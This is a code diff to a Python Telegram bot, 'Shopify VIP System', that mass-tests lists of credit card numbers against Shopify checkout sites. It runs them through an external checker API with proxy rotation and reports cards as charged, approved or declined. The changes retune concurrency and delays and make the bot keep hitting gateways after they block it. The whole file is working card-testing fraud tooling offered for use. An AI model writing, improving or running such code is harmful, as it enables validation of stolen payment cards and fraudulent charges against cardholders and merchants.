@@ -1,4 +1,4 @@
-# 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙑𝙄𝙋 𝙎𝙮𝙨𝙩𝙚𝙢 - (𝟭𝟮𝟬𝗪 - 𝗦𝘁𝗿𝗶𝗰𝘁 𝗣𝗿𝗼𝘅𝘆 - 𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸 - 𝗕𝗮𝗰𝗸 - 𝗧𝗶𝗺𝗲𝗿 - 𝟭𝟬𝟬% 𝗔𝗻𝘁𝗶-𝗟𝗮𝗴 𝗚𝗜𝗙𝘀 - 𝗜𝗻𝘀𝘁𝗮𝗻𝘁 𝗦𝘁𝗼𝗽)
+# 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝙑𝙄𝙋 𝙎𝙮𝙨𝙩𝙚𝙢 - (𝟰𝟬𝗪 - 𝟭𝟬𝟬% 𝗔𝗰𝗰𝘂𝗿𝗮𝗰𝘆 - 𝗭𝗲𝗿𝗼-𝗟𝗮𝗴 𝗚𝗜𝗙𝘀 - 𝗜𝗻𝘀𝘁𝗮𝗻𝘁 𝗦𝘁𝗼𝗽)
 from telethon.errors import FloodWaitError, UserNotParticipantError
 from telethon import TelegramClient, events, Button
 from telethon.tl.types import ChannelParticipantBanned, DocumentAttributeAnimated
@@ -56,10 +56,10 @@ CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'
 PROXY_FILE = 'proxy.txt'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 
-# --- SPEED CONFIG ---
-WORKERS = 120 
-API_TIMEOUT = 60  
-DELAY = 0.02
+# --- ACCURACY & SPEED CONFIG ---
+WORKERS = 40  
+API_TIMEOUT = 30  
+DELAY = 1.5  
 HIT_DELAY = 0.5
 
 _SITE_ERRORS_COUNT = {}
@@ -133,10 +133,6 @@ _DEAD_INDICATORS = (
 
 # ====================== ZERO-LAG INFINITY GIF PROTOCOL ======================
 async def fetch_gif_to_memory(specific_url=None):
-    """
-    المنظومة النهائية: جلب الـ GIF وحفظه في الرام مباشرة (BytesIO) بسرعة خارقة.
-    تقوم بـ 4 محاولات كحد أقصى لضمان عدم إرسال رابط معطوب.
-    """
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "image/webp,image/apng,image/*,*/*;q=0.8"
@@ -149,19 +145,15 @@ async def fetch_gif_to_memory(specific_url=None):
                 async with session.get(url, headers=headers, timeout=8, allow_redirects=True) as response:
                     if response.status == 200:
                         content_type = response.headers.get('Content-Type', '').lower()
-                        # التأكد الصارم أن المحتوى صورة وليس صفحة HTML
                         if 'image' in content_type or 'gif' in content_type:
                             data = await response.read()
                             if len(data) > 1024:
                                 gif_io = io.BytesIO(data)
-                                gif_io.name = "vip_hit.gif" # إجبار الاسم ليعرفه تيليجرام
+                                gif_io.name = "vip_hit.gif"
                                 return gif_io
         except Exception:
-            pass # فشل جلب الرابط، انتقل للرابط التالي فوراً
-            
-        if specific_url: 
-            break # إذا كانت الصورة مخصصة (كالترحيب)، لا تبحث عن بديل
-            
+            pass
+        if specific_url: break
     return None
 
 # ====================== FORCE-SEND FUNCTIONS ======================
@@ -177,12 +169,9 @@ async def styled_reply(event, text, buttons=None, use_gif=False, specific_gif=No
                     buttons=buttons, 
                     reply_to=event.message.id, 
                     parse_mode="html",
-                    attributes=[DocumentAttributeAnimated()] # فرض العرض كـ GIF غصباً
+                    attributes=[DocumentAttributeAnimated()] 
                 )
-    except Exception as e:
-        print(f"⚠️ [styled_reply] GIF Engine Error: {e}")
-        
-    # الخطة البديلة المباشرة إذا فشل الإرسال (إرسال نصي فوري)
+    except Exception: pass
     return await event.reply(text, buttons=buttons, parse_mode="html")
 
 async def styled_send(chat, text, buttons=None, use_gif=False, specific_gif=None):
@@ -196,11 +185,9 @@ async def styled_send(chat, text, buttons=None, use_gif=False, specific_gif=None
                     caption=text, 
                     buttons=buttons, 
                     parse_mode="html",
-                    attributes=[DocumentAttributeAnimated()] # فرض العرض كـ GIF غصباً
+                    attributes=[DocumentAttributeAnimated()] 
                 )
-    except Exception as e:
-        print(f"⚠️ [styled_send] GIF Engine Error: {e}")
-        
+    except Exception: pass
     return await client_instance.send_message(chat, text, buttons=buttons, parse_mode="html")
 
 async def styled_edit(msg, text, buttons=None):
@@ -221,7 +208,7 @@ async def check_single_chat(user_id, chat):
         if isinstance(part.participant, ChannelParticipantBanned): return False
         return True
     except UserNotParticipantError: return False
-    except Exception as e: return False
+    except Exception: return False
 
 async def is_user_joined(user_id):
     c_ok = await check_single_chat(user_id, JOIN_CHANNEL_ID)
@@ -416,7 +403,7 @@ async def check_card_api(card, site, proxy, session, gateway_name):
         params = {'cc': card, 'site': site}
         fproxy = format_proxy_for_api(proxy)
         if fproxy: params['proxy'] = fproxy
-        strict_timeout = aiohttp.ClientTimeout(total=20)
+        strict_timeout = aiohttp.ClientTimeout(total=API_TIMEOUT)
         async with session.get(CHECKER_API_URL, params=params, timeout=strict_timeout) as resp:
             text_data = await resp.text()
             if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
@@ -445,7 +432,11 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
     available_proxies = list(proxies) if proxies else []
     for attempt in range(max_retries):
         active_sites = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
-        if not active_sites: return {'status': 'Site Error', 'message': 'All available gateways are currently broken or blocked.', 'card': card, 'gateway': gateway_name, 'price': '-'}
+        
+        if not active_sites:
+            _SITE_ERRORS_COUNT.clear()
+            active_sites = sites
+            
         site = random.choice(active_sites)
         if not available_proxies: available_proxies = list(proxies) if proxies else []
         proxy = random.choice(available_proxies) if available_proxies else None
@@ -454,12 +445,17 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
         if not result.get('retry'): 
             if result.get('status') in ['Charged', 'Approved', 'Insufficient', 'Dead']: _SITE_ERRORS_COUNT[site] = 0
             return result
+            
         last_result = result
         msg_lower = str(result.get('message', '')).lower()
         if proxy and ('proxy' in msg_lower or 'timeout' in msg_lower) and proxy in available_proxies: available_proxies.remove(proxy)
+        
         gateway_broken_indicators = ['cloudflare', '502', '503', '504', 'bad gateway', 'service unavailable', 'site dead', 'invalid url', '404', 'not found', 'access denied']
         if any(err in msg_lower for err in gateway_broken_indicators): _SITE_ERRORS_COUNT[site] = _SITE_ERRORS_COUNT.get(site, 0) + 1
-        if attempt < max_retries - 1: await asyncio.sleep(DELAY) 
+        
+        if attempt < max_retries - 1: 
+            await asyncio.sleep(DELAY) 
+            
     if last_result: return {'status': 'Dead', 'message': f'{str(last_result["message"])[:40]}', 'card': card, 'gateway': gateway_name, 'price': last_result.get('price', '-')}
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': gateway_name, 'price': '-'}
 
@@ -493,7 +489,7 @@ async def auto_file_check_cmd(event):
             [Button.inline("🅿️ 𝘗𝘢𝘺𝘗𝘢𝘭 (𝘚𝘰𝘰𝘯)", b"gate:soon_PayPal"), Button.inline("🌐 𝘉𝘳𝘢𝘪𝘯𝘵𝘳𝘦𝘦 (𝘚𝘰𝘰𝘯)", b"gate:soon_Braintree")],
             [Button.inline("❌ 𝘊𝘢𝘯𝘤𝘦𝘭", b"gate:cancel")]
         ]
-        await styled_reply(event, f"⦗ ⚙️ ⦘ 𝘍𝘪𝘭𝘦 𝘓𝘰𝘢𝘥𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺\n\n├ 𝘛𝘰𝘵ষ্ঠ 𝘊𝘊𝘴: <code>{len(cards)}</code>\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘦𝘭𝘦𝘤𝘵 𝘢 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 𝘵𝘰 𝘴𝘵𝘢𝘳𝘵:", buttons=kb)
+        await styled_reply(event, f"⦗ ⚙️ ⦘ 𝘍𝘪𝘭𝘦 𝘓𝘰𝘢𝘥𝘦𝘥 𝘚𝘶𝘤𝘤𝘦𝘴𝘴𝘧𝘶𝘭𝘭𝘺\n\n├ 𝘛𝘰𝘵𝘢𝘭 𝘊𝘊𝘴: <code>{len(cards)}</code>\n╰ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘴𝘦𝘭𝘦𝘤𝘵 𝘢 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 𝘵𝘰 𝘴𝘵𝘢𝘳𝘵:", buttons=kb)
     except Exception as e: await event.reply(f"⚠️ Error: {e}")
 
 @client.on(events.CallbackQuery(pattern=rb"gate:(.*)"))
@@ -530,7 +526,7 @@ async def _run_mass_process(event, msg_obj, cards, process_store, stop_prefix, g
                 [Button.inline(f"⦗ 💳 ⦘ {lcd}", b"none")],
                 [Button.inline(f"🟢 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 ⇾ {charged}", b"none"), Button.inline(f"⚡ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 ⇾ {approved}", b"none")],
                 [Button.inline(f"🟡 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 ⇾ {insufficient}", b"none"), Button.inline(f"🔴 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥 ⇾ {declined}", b"none")],
-                [Button.inline(f"⚠️ 𝘌𝘳𝘳𝘰𝘳 ⇾ {errors}", b"none"), Button.inline(f"📊 𝘛𝘰𝘵𝘢𝘭 ⇾ {checked} / {total}", b"none")],
+                [Button.inline(f"⚠️ 𝘌𝘳𝘳𝘰𝘳 ⇾ {errors}", b"none"), Button.inline(f"📊 𝘛𝘰𝘵𝘢𝘭 𝘊𝘊𝘴 ⇾ {checked} / {total}", b"none")],
                 [Button.inline("🛑 𝘚𝘵𝘰𝘱 𝘗𝘳𝘰𝘤𝘦𝘴𝘴", f"{stop_prefix}:{uid}".encode())]
             ]
             try: await styled_edit(msg_obj, f"⦗ ⚡ ⦘ 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘈𝘤𝘵𝘪𝘷𝘦...\n\n├ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 ⇾ <code>{gate_name}</code>\n╰ 𝘛𝘩𝘳𝘦𝘢𝘥𝘴 ⇾ <code>{WORKERS}</code>", buttons=kb)
@@ -579,8 +575,7 @@ async def _run_mass_process(event, msg_obj, cards, process_store, stop_prefix, g
 
     workers_tasks = [asyncio.create_task(worker()) for _ in range(WORKERS)]
     
-    process_store[uid]["tasks"] = workers_tasks 
-    process_store[uid]["tasks"].append(updater_task) 
+    process_store[uid]["tasks"] = workers_tasks + [updater_task]
 
     await asyncio.gather(*workers_tasks, return_exceptions=True)
     
@@ -591,7 +586,7 @@ async def _run_mass_process(event, msg_obj, cards, process_store, stop_prefix, g
     fkb = [
         [Button.inline(f"🟢 𝘊𝘩𝘢𝘳𝘨𝘦𝘥 ⇾ {charged}", b"none"), Button.inline(f"⚡ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 ⇾ {approved}", b"none")],
         [Button.inline(f"🟡 𝘐𝘯𝘴𝘶𝘧𝘧𝘪𝘤𝘪𝘦𝘯𝘵 ⇾ {insufficient}", b"none"), Button.inline(f"🔴 𝘋𝘦𝘤𝘭𝘪𝘯𝘦𝘥 ⇾ {declined}", b"none")],
-        [Button.inline(f"📊 𝘛𝘰𝘵𝘢𝘭 𝘊𝘩𝘦𝘤𝘬𝘦𝘥 ⇾ {checked} / {total}", b"none")],
+        [Button.inline(f"📊 𝘛𝘰𝘵𝘢𝘭 𝘊𝘊𝘴 ⇾ {checked} / {total}", b"none")],
         [Button.inline(f"⏱ 𝘛𝘪𝘮𝘦 𝘛𝘢𝘬𝘦𝘯 ⇾ {h}𝘩 {m}𝘮 {s}𝘴", b"none")]
     ]
     try: await styled_edit(msg_obj, f"{'⦗ 🛑 ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘍𝘰𝘳𝘤𝘦 𝘚𝘵𝘰𝘱𝘱𝘦𝘥' if is_stopped() else '⦗ ✨ ⦘ 𝘗𝘳𝘰𝘤𝘦𝘴𝘴 𝘊𝘰𝘮𝘱𝘭𝘦𝘵𝘦𝘥'}\n\n├ 𝘎𝘢𝘵𝘦𝘸𝘢𝘺: <code>{gate_name}</code>\n╰ 𝘚𝘦𝘴𝘴𝘪𝘰𝘯 𝘊𝘭𝘰𝘴𝘦𝘥. 𝘌𝘯𝘫𝘰𝘺 𝘺𝘰𝘶𝘳 𝘦𝘹𝘤𝘭𝘶𝘴𝘪𝘷𝘦 𝘩𝘪𝘵𝘴 𝘢𝘣𝘰𝘷𝘦 👑", buttons=fkb)
@@ -739,7 +734,7 @@ async def start(event):
         await ensure_user(event.sender_id)
         plan = await get_user_plan(event.sender_id)
         limit = get_cc_limit(plan, event.sender_id)
-        text = f"""⦗ ⚡ ⦘ 𝘚𝘩𝘰𝘱𝘪𝘧𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮
+        text = f"""⦗ ⚡ ⦘ 𝘚𝘩𝘰𝘱𝘪Բ𝘺 𝘝𝘐𝘗 𝘚𝘺𝘴𝘵𝘦𝘮
 
 ├ ⦗ 💳 ⦘ 𝘊𝘩𝘦𝘤𝘬𝘪𝘯𝘨
 │ ╰ 𝘚𝘦𝘯𝘥 𝘢 𝘧𝘪𝘭𝘦 𝘵𝘰 𝘢𝘶𝘵𝘰-𝘴𝘵𝘢𝘳𝘵 𝘔𝘢𝘴𝘴 𝘊𝘩𝘦𝘤𝘬
@@ -856,7 +851,7 @@ async def main():
     while True:
         try:
             await client.start(bot_token=BOT_TOKEN)
-            print("✅ VIP BOT STARTED WITH ZERO-LAG INFINITY GIF PROTOCOL!"); await client.run_until_disconnected()
+            print("✅ VIP BOT STARTED WITH 100% ACCURACY AND SMART DELAY!"); await client.run_until_disconnected()
         except FloodWaitError as e: await asyncio.sleep(e.seconds + 5)
         except: await asyncio.sleep(10)
 
